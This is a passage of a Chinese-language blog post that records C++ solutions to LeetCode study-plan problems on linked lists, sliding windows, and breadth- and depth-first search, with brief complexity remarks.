class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     ListNode *next;</span><br><span class="hljs-comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">removeNthFromEnd</span><span class="hljs-params">(ListNode* head, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-comment">//快慢指针</span><br>        ListNode *slow=head,*fast=head;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            fast=fast-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(fast==<span class="hljs-literal">nullptr</span>)<br>        &#123;<br>            head=head-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">while</span>(fast!=<span class="hljs-literal">nullptr</span>&amp;&amp;fast-&gt;next!=<span class="hljs-literal">nullptr</span>)<br>        &#123;<br>            slow=slow-&gt;next;<br>            fast=fast-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(slow-&gt;next!=<span class="hljs-literal">nullptr</span>)<br>            slow-&gt;next=slow-&gt;next-&gt;next;<br>        <span class="hljs-keyword">else</span><br>            slow-&gt;next=<span class="hljs-literal">nullptr</span>;    <br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度：$O(n)$</li><li>链表，双指针</li></ul><h2 id="第-6-天-滑动窗口"><a href="#第-6-天-滑动窗口" class="headerlink" title="第 6 天 滑动窗口"></a>第 6 天 滑动窗口</h2><h3 id="3-无重复字符的最长子串"><a href="#3-无重复字符的最长子串" class="headerlink" title="3. 无重复字符的最长子串"></a><a href="https://leetcode.cn/problems/longest-substring-without-repeating-characters/">3. 无重复字符的最长子串</a></h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">lengthOfLongestSubstring</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-type">int</span> len=s.<span class="hljs-built_in">length</span>();<br>        map&lt;<span class="hljs-type">char</span>,<span class="hljs-type">int</span>&gt; h;<br>        <span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>,l=<span class="hljs-number">0</span>,r=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        &#123;<br>            <br>            <span class="hljs-keyword">if</span>(h.<span class="hljs-built_in">find</span>(s[i])==h.<span class="hljs-built_in">end</span>())<br>            &#123;<br>                <span class="hljs-comment">//字符s[i]最近出现的位置</span><br>                h[s[i]]=i;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                l=<span class="hljs-built_in">max</span>(h[s[i]]+<span class="hljs-number">1</span>,l);<br>                h[s[i]]=i;<br>            &#125;<br>            r=i;<br>            <span class="hljs-keyword">if</span>(r-l+<span class="hljs-number">1</span>&gt;ans)<br>                ans=r-l+<span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度$O(n)$</li><li>哈希表，字符串，滑动窗口</li></ul><h3 id="567-字符串的排列"><a href="#567-字符串的排列" class="headerlink" title="567. 字符串的排列"></a><a href="https://leetcode.cn/problems/permutation-in-string/">567. 字符串的排列</a></h3><ul><li>参考了题解</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">//s1 和 s2 仅包含小写字母</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">checkInclusion</span><span class="hljs-params">(string s1, string s2)</span> </span>&#123;<br>        <span class="hljs-type">int</span> len1=s1.<span class="hljs-built_in">length</span>(),len2=s2.<span class="hljs-built_in">length</span>();<br>        <span class="hljs-comment">//异常情况</span><br>        <span class="hljs-keyword">if</span>(len1&gt;len2)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-type">int</span> windowSize=len1;<br>        <span class="hljs-comment">//s1的频率分布字典</span><br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">vec1</span><span class="hljs-params">(<span class="hljs-number">26</span>,<span class="hljs-number">0</span>)</span></span>;<br>        <span class="hljs-comment">//动态窗口的频率分布字典</span><br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">vecWin</span><span class="hljs-params">(<span class="hljs-number">26</span>,<span class="hljs-number">0</span>)</span></span>;<br>        <span class="hljs-comment">//构建字典</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;windowSize;i++)<br>        &#123;<br>            vec1[s1[i]-<span class="hljs-string">&#x27;a&#x27;</span>]++;<br>            vecWin[s2[i]-<span class="hljs-string">&#x27;a&#x27;</span>]++;<br>        &#125;<br>        <span class="hljs-comment">//滑动窗口</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=windowSize<span class="hljs-number">-1</span>;i&lt;len2;i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(vec1==vecWin)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            vecWin[s2[i+<span class="hljs-number">1</span>-windowSize]-<span class="hljs-string">&#x27;a&#x27;</span>]--;<br>            <span class="hljs-keyword">if</span>(i&lt;len2<span class="hljs-number">-1</span>)<br>                vecWin[s2[i+<span class="hljs-number">1</span>]-<span class="hljs-string">&#x27;a&#x27;</span>]++;;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度$O(n)$</li><li>哈希表，字符串</li></ul><h2 id="第-7-天-广度优先搜索-深度优先搜索"><a href="#第-7-天-广度优先搜索-深度优先搜索" class="headerlink" title="第 7 天 广度优先搜索 / 深度优先搜索"></a>第 7 天 广度优先搜索 / 深度优先搜索</h2><h3 id="733-图像渲染"><a href="#733-图像渲染" class="headerlink" title="733. 图像渲染"></a><a href="https://leetcode.cn/problems/flood-fill/">733. 图像渲染</a></h3><p>有一幅以 m x n 的二维整数数组表示的图画 image ，其中 image[i][j] 表示该图画的像素值大小。</p><p>你也被给予三个整数 sr ,  sc 和 newColor 。你应该从像素 image[sr][sc] 开始对图像进行 上色填充 。</p><p>为了完成 上色工作 ，从初始像素开始，记录初始坐标的 上下左右四个方向上 像素值与初始坐标相同的相连像素点，接着再记录这四个方向上符合条件的像素点与他们对应 四个方向上 像素值与初始坐标相同的相连像素点，……，重复该过程。将所有有记录的像素点的颜色值改为 newColor 。</p><p>最后返回 经过上色渲染后的图像 。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; image, <span class="hljs-type">int</span> sr, <span class="hljs-type">int</span> sc, <span class="hljs-type">int</span> newColor,unordered_map&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt; vis)</span></span><br><span class="hljs-function">    </span>&#123;<br>        vis[sr*<span class="hljs-number">50</span>+sc]=<span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> mx[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;,my[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>&#125;;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)<br>        &#123;<br>            <span class="hljs-type">int</span> x1=sr+mx[i],y1=sc+my[i];<br>            <span class="hljs-keyword">if</span>(x1&gt;=<span class="hljs-number">0</span>&amp;&amp;x1&lt;image.<span class="hljs-built_in">size</span>()&amp;&amp;y1&gt;=<span class="hljs-number">0</span>&amp;&amp;y1&lt;image[sr].<span class="hljs-built_in">size</span>()&amp;&amp;vis[x1*<span class="hljs-number">50</span>+y1]==<span class="hljs-number">0</span>&amp;&amp;image[sr][sc]==image[x1][y1])<br>            &#123;<br>                <span class="hljs-built_in">dfs</span>(image,sr+mx[i],sc+my[i],newColor,vis);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(image[sr][sc]!=newColor)<br>            image[sr][sc]=newColor;<br>    &#125;<br>    <span class="hljs-comment">//x上下，y左右</span><br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">floodFill</span>(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; image, <span class="hljs-type">int</span> sr, <span class="hljs-type">int</span> sc, <span class="hljs-type">int</span> newColor) &#123;<br>        unordered_map&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt; vis;<br>        <span class="hljs-built_in">dfs</span>(image,sr,sc,newColor,vis);<br>        <span class="hljs-keyword">return</span> image;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>深度优先搜索，数组</li></ul><h3 id="695-岛屿的最大面积"><a href="#695-岛屿的最大面积" class="headerlink" title="695. 岛屿的最大面积"></a><a href="https://leetcode.cn/problems/max-area-of-island/">695. 岛屿的最大面积</a></h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dfs</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; grid,<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y,<span class="hljs-type">int</span> count)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(x&lt;<span class="hljs-number">0</span>||x&gt;=grid.<span class="hljs-built_in">size</span>()||y&lt;<span class="hljs-number">0</span>||y&gt;=grid[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>()||grid[x][y]==<span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> count;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            grid[x][y]=<span class="hljs-number">0</span>;<br>            count++;<br>            count=<span class="hljs-built_in">max</span>(count,<span class="hljs-built_in">dfs</span>(grid,x+<span class="hljs-number">1</span>,y,count));<br>            count=<span class="hljs-built_in">max</span>(count,<span class="hljs-built_in">dfs</span>(grid,x<span class="hljs-number">-1</span>,y,count));<br>            count=<span class="hljs-built_in">max</span>(count,<span class="hljs-built_in">dfs</span>(grid,x,y<span class="hljs-number">-1</span>,count));<br>            count=<span class="hljs-built_in">max</span>(count,<span class="hljs-built_in">dfs</span>(grid,x,y+<span class="hljs-number">1</span>,count));<br>            <span class="hljs-keyword">return</span> count;<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxAreaOfIsland</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;grid.<span class="hljs-built_in">size</span>();i++)<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;grid[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(grid[i][j])<br>                    ans=<span class="hljs-built_in">max</span>(ans,<span class="hljs-built_in">dfs</span>(grid,i,j,<span class="hljs-number">0</span>));<br>            &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>深度优先搜索</li></ul><h2 id="第-8-天-广度优先搜索-深度优先搜索"><a href="#第-8-天-广度优先搜索-深度优先搜索" class="headerlink" title="第 8 天 广度优先搜索 / 深度优先搜索"></a>第 8 天 广度优先搜索 / 深度优先搜索</h2><h3 id="617-合并二叉树"><a href="#617-合并二叉树" class="headerlink" title="617. 合并二叉树"></a><a href="https://leetcode.cn/problems/merge-two-binary-trees/">617. 合并二叉树</a></h3><p>给你两棵二叉树： root1 和 root2 。</p><p>想象一下，当你将其中一棵覆盖到另一棵之上时，两棵树上的一些节点将会重叠（而另一些不会）。你需要将这两棵树合并成一棵新二叉树。合并的规则是：如果两个节点重叠，那么将这两个节点的值相加作为合并后节点的新值；否则，不为 null 的节点将直接作为新二叉树的节点。</p><p>返回合并后的二叉树。</p><p>注意: 合并过程必须从两个树的根节点开始。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">//前序遍历</span><br>    <span class="hljs-function">TreeNode* <span class="hljs-title">mergeTrees</span><span class="hljs-params">(TreeNode* root1, TreeNode* root2)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(root1==<span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span> root2;<br>        <span class="hljs-keyword">if</span>(root2==<span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span> root1;<br>        root1-&gt;val+=root2-&gt;val;<br>        root1-&gt;left=<span class="hljs-built_in">mergeTrees</span>(root1-&gt;left,root2-&gt;left);<br>        root1-&gt;right=<span class="hljs-built_in">mergeTrees</span>(root1-&gt;right,root2-&gt;right);<br>        <span class="hljs-keyword">return</span> root1;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度: $O(max(n1,n2))，n1、n2分别为树的结点个数$</li></ul><h3 id="116-填充每个节点的下一个右侧节点指针"><a href="#116-填充每个节点的下一个右侧节点指针" class="headerlink" title="116. 填充每个节点的下一个右侧节点指针"></a><a href="https://leetcode.cn/problems/populating-next-right-pointers-in-each-node/">116. 填充每个节点的下一个右侧节点指针</a></h3><p>给定一个 完美二叉树 ，其所有叶子节点都在同一层，每个父节点都有两个子节点。二叉树定义如下：</p><p>struct Node {<br>  int val;<br>  Node <em>left;<br>  Node </em>right;<br>  Node *next;<br>}<br>填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 NULL。</p><p>初始状态下，所有 next 指针都被设置为 NULL。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><br><span class="hljs-comment">// Definition for a Node.</span><br><span class="hljs-comment">class Node &#123;</span><br><span class="hljs-comment">public:</span><br><span class="hljs-comment">    int val;</span><br><span class="hljs-comment">    Node* left;</span><br><span class="hljs-comment">    Node* right;</span><br><span class="hljs-comment">    Node* next;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Node() : val(0), left(NULL), right(NULL), next(NULL) &#123;&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Node(int _val) : val(_val), left(NULL), right(NULL), next(NULL) &#123;&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Node(int _val, Node* _left, Node* _right, Node* _next)</span><br><span class="hljs-comment">        : val(_val), left(_left), right(_right), next(_next) &#123;&#125;</span><br><span class="hljs-comment">&#125;;</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">Node* <span class="hljs-title">connect</span><span class="hljs-params">(Node* root)</span> </span>&#123;<br>        <span class="hljs-comment">//当前层</span><br>        queue&lt;Node*&gt; now;<br>        now.<span class="hljs-built_in">push</span>(root);<br>        Node* p=<span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">while</span>(!now.<span class="hljs-built_in">empty</span>())<br>        &#123;<br>            <span class="hljs-comment">//下一层</span><br>            queue&lt;Node*&gt; nextLay;<br>            Node* temp=<span class="hljs-literal">NULL</span>;<br>            <span class="hljs-keyword">while</span>(!now.<span class="hljs-built_in">empty</span>())<br>            &#123;<br>                p=now.<span class="hljs-built_in">front</span>();<br>                now.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-keyword">if</span>(p)<br>                &#123;<br>                    <span class="hljs-keyword">if</span>(p-&gt;left)<br>                        nextLay.<span class="hljs-built_in">push</span>(p-&gt;left);<br>                    <span class="hljs-keyword">if</span>(p-&gt;right)<br>                        nextLay.<span class="hljs-built_in">push</span>(p-&gt;right);<br>                &#125;<br>                <span class="hljs-keyword">if</span>(temp)<br>                &#123;<br>                    temp-&gt;next=p;<br>                &#125;<br>                temp=p;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(p)<br>                p-&gt;next=<span class="hljs-literal">NULL</span>;<br>            now=nextLay;<br>        &#125;<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><h2 id="第-9-天-广度优先搜索-深度优先搜索"><a href="#第-9-天-广度优先搜索-深度优先搜索" class="headerlink" title="第 9 天 广度优先搜索 / 深度优先搜索"></a>第 9 天 广度优先搜索 / 深度优先搜索</h2><h3 id="542-01-矩阵"><a href="#542-01-矩阵" class="headerlink" title="542. 01 矩阵"></a><a href="https://leetcode.cn/problems/01-matrix/">542. 01 矩阵</a></h3><p>给定一个由 0 和 1 组成的矩阵 mat ，请输出一个大小相同的矩阵，其中每一个格子是 mat 中对应位置元素到最近的 0 的距离。</p><p>两个相邻元素间的距离为 1 。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">updateMatrix</span>(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; mat) &#123;<br>        <span class="hljs-comment">//以0为第一层进行广度优先搜索</span><br>        <span class="hljs-type">int</span> row_size=mat.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> col_size=mat[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        queue&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt; q;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;row_size;i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;col_size;j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(mat[i][j]==<span class="hljs-number">0</span>)<br>                &#123;<br>                    <span class="hljs-comment">//emplace 可以直接传入构造对象需要的元素， 然后自己调用其构造函数</span><br>                    q.<span class="hljs-built_in">emplace</span>(i,j);<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-comment">//未访问标记</span><br>                    mat[i][j]=<span class="hljs-number">-1</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-type">int</span> dx[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">-1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;,dy[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">1</span>&#125;;<br>        <span class="hljs-keyword">while</span>(!q.<span class="hljs-built_in">empty</span>())<br>        &#123;<br>            <span class="hljs-keyword">auto</span> [x,y]=q.<span class="hljs-built_in">front</span>();<br>            q.<span class="hljs-built_in">pop</span>();<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)<br>            &#123;<br>                <span class="hljs-type">int</span> newx=x+dx[i];<br>                <span class="hljs-type">int</span> newy=y+dy[i];<br>                <span class="hljs-keyword">if</span>(newx&gt;=<span class="hljs-number">0</span>&amp;&amp;newx&lt;row_size&amp;&amp;newy&gt;=<span class="hljs-number">0</span>&amp;&amp;newy&lt;col_size&amp;&amp;mat[newx][newy]==<span class="hljs-number">-1</span>)<br>                &#123;<br>                    mat[newx][newy]=mat[x][y]+<span class="hljs-number">1</span>;<br>                    q.<span class="hljs-built_in">emplace</span>(newx,newy);<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> mat;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>广度优先搜索，数组</li></ul><h3 id="994-腐烂的橘子"><a href="#994-腐烂的橘子" class="headerlink" title="994. 腐烂的橘子"></a><a href="https://leetcode.cn/problems/rotting-oranges/">994. 腐烂的橘子</a></h3><p>在给定的 m x n 网格 grid 中，每个单元格可以有以下三个值之一：</p><p>值 0 代表空单元格；<br>值 1 代表新鲜橘子；<br>值 2 代表腐烂的橘子。<br>每分钟，腐烂的橘子 周围 4 个方向上相邻 的新鲜橘子都会腐烂。</p><p>返回 直到单元格中没有新鲜橘子为止所必须经过的最小分钟数。如果不可能，返回 -1 。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 